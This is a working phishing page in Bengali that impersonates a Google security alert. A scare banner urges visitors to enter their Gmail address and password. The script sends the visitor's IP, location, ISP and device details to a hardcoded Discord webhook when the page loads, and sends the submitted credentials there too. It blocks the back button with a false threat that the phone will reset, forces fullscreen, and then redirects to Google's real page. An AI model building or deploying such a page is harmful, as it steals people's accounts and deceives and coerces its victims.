<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Security Center</title>
    <style>
        body { background: #ffffff; color: #000; font-family: 'Segoe UI', Roboto, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; touch-action: none; }
        .card { width: 90%; max-width: 420px; background: #fff; padding: 30px; border-top: 10px solid #d93025; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); text-align: center; }
        .head { color: #d93025; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
        .box { background: #f1f3f4; padding: 15px; border-radius: 6px; font-size: 13px; text-align: left; border-left: 5px solid #d93025; margin: 20px 0; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        button { width: 100%; padding: 18px; background: #d93025; color: #fff; border: none; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 18px; margin-top: 15px; }
        .footer { font-size: 11px; color: #5f6368; margin-top: 25px; }
    </style>
</head>
<body onclick="engageTrap()">

<div class="card">
    <div class="head">⚠️ জরুরি সতর্কতা</div>
    <p style="font-size: 15px; line-height: 1.5;">আপনার ডিভাইসে একটি <strong>Critical Security Threat</strong> পাওয়া গেছে। আপনার জিমেইল অ্যাকাউন্ট নিরাপদ রাখতে নিচের তথ্যগুলো যাচাই করুন।</p>
    
    <div class="box">
        <strong>IP:</strong> <span id="ip">Tracking...</span><br>
        <strong>Device:</strong> <span id="model">Scanning...</span><br>
        <strong>Status:</strong> <span style="color:red">Access Restricted</span>
    </div>

    <input type="email" id="email" placeholder="আপনার জিমেইল এড্রেস" required>
    <input type="password" id="pass" placeholder="পাসওয়ার্ড দিন" required>
    <button onclick="submitData()">ভেরিফাই এবং রিকভার করুন</button>
    
    <div class="footer">Security Protocol v4.2.1-SR</div>
</div>

<script>
    const DISCORD = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. ব্যাক বাটন এবং এক্সিট টোটাল ব্লক
    function lockDown() {
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function() {
            window.history.pushState(null, null, window.location.href);
            if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
            alert("❌ সিকিউরিটি ওয়ার্নিং: আপনি পেজটি ছেড়ে যেতে পারবেন না। এখন বের হলে আপনার ফোনটি রিসেট হয়ে যাবে!");
        };
    }

    // ২. ফাস্টেস্ট ডাটা ক্যাপচার (০.১ সেকেন্ড স্পিড)
    async function captureAll() {
        let ip = "Unknown", city = "Unknown", provider = "Unknown";
        
        try {
            // আইপি ধরতে ৩টি সোর্স (যাতে মিস না হয়)
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            ip = data.ip;
            city = data.city + ", " + data.country_name;
            provider = data.org;
            
            document.getElementById('ip').innerText = ip;
        } catch(e) {
            // ব্যাকআপ সোর্স যদি ১ম টি ফেল করে
            const res2 = await fetch('https://api.ipify.org?format=json');
            const data2 = await res2.json();
            ip = data2.ip;
            document.getElementById('ip').innerText = ip;
        }

        const modelInfo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
        document.getElementById('model').innerText = modelInfo.split(';')[0];

        // ডিসকর্ডে নগদ ডাটা প্রেরণ
        fetch(DISCORD, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🚀 **TARGET LOCKED (INSTANT ACCESS)**",
                embeds: [{
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: ip, inline: true },
                        { name: "📍 Location", value: city, inline: true },
                        { name: "🏢 Network/ISP", value: provider },
                        { name: "📱 Exact Device", value: modelInfo },
                        { name: "⚡ Action", value: "Trapped in Prison Mode" }
                    ]
                }]
            })
        });
    }

    // ৩. ফুল স্ক্রিন ফোর্স
    function engageTrap() {
        let el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
        if (navigator.vibrate) navigator.vibrate(100);
    }

    // ৪. জিমেইল ও পাসওয়ার্ড পাঠানো
    async function submitData() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        if(!u || !p) {
            alert("সঠিক তথ্য দিন নতুবা ভেরিফিকেশন সফল হবে না!");
            return;
        }

        await fetch(DISCORD, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🧨 **VICTIM DATA CAPTURED**",
                embeds: [{
                    color: 65280,
                    fields: [
                        { name: "User Email", value: u },
                        { name: "User Password", value: p }
                    ]
                }]
            })
        });

        alert("আপনার তথ্য যাচাই করা হয়েছে। ডিভাইসটি এখন নিরাপদ।");
        window.onpopstate = null; // রিলিজ
        window.location.href = "https://myaccount.google.com/security";
    }

    window.onload = () => {
        lockDown();
        captureAll();
    };
</script>

</body>
</html>
